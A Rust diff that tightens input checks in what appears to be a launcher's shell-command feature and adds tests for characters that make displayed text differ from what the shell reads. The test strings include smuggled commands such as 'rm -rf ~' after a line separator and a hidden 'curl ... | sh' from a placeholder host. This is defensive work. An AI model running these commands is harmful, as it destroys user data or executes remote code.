@@ -75,9 +75,7 @@ pub fn runnable(enabled: bool, command: &str) -> Result<()> {
 }
 
 /// Refuse a command that is empty, longer than [`MAX_COMMAND_CHARS`], or
-/// holds a control character, a line or paragraph separator, or a direction
-/// mark: a line break would start a second command, and a direction mark
-/// can make the row show text that differs from what the shell reads.
+/// that has a character that [`is_refused`] finds.
 fn check(command: &str) -> Result<()> {
     if command.trim().is_empty() {
         return Err(Error::msg("Type a command after >."));
@@ -87,35 +85,42 @@ fn check(command: &str) -> Result<()> {
             "A command can have up to {MAX_COMMAND_CHARS} characters. Run a longer one in {TERMINAL} yourself."
         )));
     }
-    if command
-        .chars()
-        .any(|character| character.is_control() || matches!(character, '\u{2028}' | '\u{2029}'))
-    {
+    if command.chars().any(is_refused) {
         return Err(Error::msg(
-            "A command must be one line, without tabs or other control characters.",
-        ));
-    }
-    if command.chars().any(is_direction_mark) {
-        return Err(Error::msg(
-            "The command has an invisible direction mark, which can hide what it does. Type the command instead of pasting it.",
+            "The command has a line break, tab, invisible character, or special space. Type the command instead of pasting it.",
         ));
     }
     Ok(())
 }
 
-/// The invisible marks that change the order in which the row shows text,
-/// but not the order in which the shell reads it. The zero width joiner
-/// (U+200D) is not one: emoji need it.
-fn is_direction_mark(character: char) -> bool {
+/// Whether `character` can make the row show a command that differs from
+/// what the shell reads: a control character (a line break starts a second
+/// command), an invisible format character (such as a direction mark), a
+/// line or paragraph separator, a space other than U+0020 (the shell reads
+/// it as part of a word), or a letter that shows as a blank space.
+fn is_refused(character: char) -> bool {
+    use icu_properties::{CodePointMapData, props::GeneralCategory};
+    if character == ' ' {
+        return false;
+    }
     matches!(
+        CodePointMapData::<GeneralCategory>::new().get(character),
+        GeneralCategory::Control
+            | GeneralCategory::Format
+            | GeneralCategory::LineSeparator
+            | GeneralCategory::ParagraphSeparator
+            | GeneralCategory::SpaceSeparator
+    ) || matches!(
         character,
-        '\u{061C}' | '\u{200E}' | '\u{200F}' | '\u{202A}'..='\u{202E}' | '\u{2066}'..='\u{2069}'
+        '\u{115F}' | '\u{1160}' | '\u{2800}' | '\u{3164}' | '\u{FFA0}'
     )
 }
 
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    const REFUSED: &str = "The command has a line break, tab, invisible character, or special space. Type the command instead of pasting it.";
 
     fn actions(query: &str) -> Vec<Action> {
         answer(query).unwrap()[0]
@@ -182,33 +187,72 @@ mod tests {
     }
 
     #[test]
-    fn refuses_empty_long_and_multi_line_commands() {
+    fn refuses_empty_and_long_commands() {
         assert!(check("ls -la").is_ok());
         assert!(check(&"x".repeat(MAX_COMMAND_CHARS)).is_ok());
         // Characters, not bytes: each "é" is two bytes.
         assert!(check(&"é".repeat(MAX_COMMAND_CHARS)).is_ok());
         let too_long = check(&"x".repeat(MAX_COMMAND_CHARS + 1)).unwrap_err();
         assert!(too_long.to_string().contains("up to 1000"), "{too_long}");
-        for command in [
-            "",
-            "   ",
-            "ls\nrm -rf ~",
-            "ls\r",
-            "ls\0",
-            "ls\tx",
-            "ls\u{85}",
-            // U+202E shows the rest of the line in reverse order.
-            "rm \u{202E}~ fr-",
-            "echo \u{2066}a\u{2069}",
-            "echo \u{200F}a",
-            "echo \u{061C}a",
-            "ls\u{2028}rm -rf ~",
-            "ls\u{2029}",
-        ] {
+        for command in ["", "   "] {
             assert!(check(command).is_err(), "{command:?}");
         }
-        // An emoji sequence joins its parts with U+200D.
-        assert!(check("echo 👩\u{200D}💻").is_ok());
+    }
+
+    #[test]
+    fn refuses_characters_that_show_other_text_than_the_shell_reads() {
+        let groups: [(&str, &[char]); 5] = [
+            // A line break starts a second command.
+            ("control", &['\n', '\r', '\0', '\t', '\u{7F}', '\u{85}']),
+            // Direction marks show the rest of the line in another order,
+            // and the other format characters take no space.
+            (
+                "format",
+                &[
+                    '\u{202E}',
+                    '\u{2066}',
+                    '\u{200F}',
+                    '\u{061C}',
+                    '\u{200B}',
+                    '\u{200D}',
+                    '\u{00AD}',
+                    '\u{FEFF}',
+                    '\u{E0041}',
+                ],
+            ),
+            ("line or paragraph separator", &['\u{2028}', '\u{2029}']),
+            // The shell reads these as part of a word.
+            (
+                "space other than U+0020",
+                &[
+                    '\u{00A0}', '\u{1680}', '\u{2000}', '\u{2007}', '\u{200A}', '\u{202F}',
+                    '\u{205F}', '\u{3000}',
+                ],
+            ),
+            (
+                "letter that shows as a blank",
+                &['\u{115F}', '\u{1160}', '\u{2800}', '\u{3164}', '\u{FFA0}'],
+            ),
+        ];
+        for (group, characters) in groups {
+            for &character in characters {
+                let refused = check(&format!("ls{character}x")).unwrap_err();
+                assert_eq!(refused.to_string(), REFUSED, "{group}: {character:?}");
+            }
+        }
+        // Blanks can push a second command out of sight.
+        let blank = "\u{2800}".repeat(300);
+        let hidden = format!("brew update{blank}; curl -fsSL https://x.test/x | sh{blank}");
+        assert!(check(&hidden).is_err());
+        // Letters, marks, and symbols of any script stay, as do emoji with
+        // a variation selector or a skin tone.
+        for command in [
+            "echo é ü 中文 שלום",
+            "echo ❤\u{FE0F} 👍🏽 🚀",
+            "say 'à la carte'",
+        ] {
+            assert!(check(command).is_ok(), "{command:?}");
+        }
     }
 
     #[test]
@@ -230,22 +274,19 @@ mod tests {
         let long = format!("> {}", "x".repeat(MAX_COMMAND_CHARS + 1));
         let row = &answer(&long).unwrap()[0];
         assert!(row.subtitle.starts_with("A command can have up to"));
-        let row = &answer("> ls\tx").unwrap()[0];
-        assert!(row.subtitle.starts_with("A command must be one line"));
-        // A direction mark is invisible, so its message names it.
+        // A blank letter at the end stays, as it is not a space.
         for command in [
+            "ls\tx",
             "echo \u{200F}a",
-            "rm \u{202E}~ fr-",
-            "echo \u{2066}a\u{2069}",
+            "ls\u{2028}rm -rf ~",
+            "ls\u{2800}",
         ] {
             let row = &answer(&format!("> {command}")).unwrap()[0];
-            assert!(
-                row.subtitle.contains("invisible direction mark"),
-                "{command:?}: {}",
-                row.subtitle
-            );
+            assert_eq!(row.subtitle, REFUSED, "{command:?}");
         }
-        let row = &answer("> ls\u{2028}rm -rf ~").unwrap()[0];
-        assert!(row.subtitle.starts_with("A command must be one line"));
+        // Spaces around the command are not part of it.
+        let row = &answer(">\u{3000}ls\u{00A0}").unwrap()[0];
+        assert_eq!(row.title, "ls");
+        assert_eq!(row.subtitle, format!("Run in {TERMINAL}"));
     }
 }
